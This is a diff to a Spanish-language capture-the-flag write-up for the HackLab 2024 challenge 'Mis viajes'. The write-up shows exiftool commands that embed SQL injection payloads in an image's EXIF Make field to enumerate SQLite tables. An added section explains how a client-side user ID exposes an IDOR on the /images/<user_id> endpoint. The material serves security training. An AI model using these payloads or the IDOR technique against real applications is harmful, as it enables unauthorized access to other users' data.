@@ -27,12 +27,12 @@ Se enumeran las tablas de `sqlite_master`. El payload concatena (`|| ... ||`) el
 ```bash
 exiftool -Make="'||(SELECT name FROM sqlite_master LIMIT 1 OFFSET 0)||'" test.jpg_original
 exiftool -Make="'||(SELECT name FROM sqlite_master LIMIT 1 OFFSET 1)||'" test.jpg_original
+exiftool -Make="'||(SELECT name FROM sqlite_master LIMIT 1 OFFSET 2)||'" test.jpg_original
 ```
 
 ![Desafío 27 - Mis viajes (HackLab 2024) - imagen 2](assets/02.png)
 
 ```bash
-exiftool -Make="'||(SELECT name FROM sqlite_master LIMIT 1 OFFSET 2)||'" test.jpg_original
 exiftool -Make="'||(SELECT sql FROM sqlite_master WHERE name='images')||'" test.jpg_original
 ```
 
@@ -52,9 +52,17 @@ ID encontrado:
 
 ![Desafío 27 - Mis viajes (HackLab 2024) - imagen 4](assets/04.png)
 
-![Desafío 27 - Mis viajes (HackLab 2024) - imagen 5](assets/05.png)
+### Cómo se llega al endpoint
 
-Con el `user_id` de la víctima ya no hacen falta más inyecciones SQL: basta con acceder directamente al endpoint que el front usa para listar imágenes (`/images/<user_id>`), que no valida que el ID solicitado coincida con el usuario autenticado (IDOR). Se abre en el navegador:
+El endpoint no hay que adivinarlo: está en el propio código del front. Al revisar el `script.js` de la galería (visible desde las DevTools del navegador, pestaña *Sources*), se ve que la lista de imágenes se carga con una llamada del tipo:
+
+```javascript
+fetch(`/images/${USER_ID}`)
+```
+
+Es decir, el front pide las imágenes a `/images/<user_id>`, tomando el `USER_ID` desde el DOM (p. ej. `document.getElementById("id_user").value`). Ese valor es del lado del cliente, así que es totalmente manipulable: si el backend no valida que el `user_id` solicitado coincida con el de la sesión autenticada, se puede pedir las imágenes de cualquier usuario (IDOR).
+
+Con el `user_id` de la víctima extraído por la inyección SQL, ya no hacen falta más payloads: basta con reproducir esa misma llamada apuntando al ID ajeno. Se abre directamente en el navegador:
 
 ```
 /images/1089b4a3-b6d0-450d-9c8a-b120b30bcb04
@@ -62,7 +70,7 @@ Con el `user_id` de la víctima ya no hacen falta más inyecciones SQL: basta co
 
 La respuesta es un JSON con las imágenes de ese usuario, cuyo campo `description` contiene la flag.
 
-![Desafío 27 - Mis viajes (HackLab 2024) - imagen 6](assets/06.png)
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 5](assets/05.png)
 
 ## Flag
 
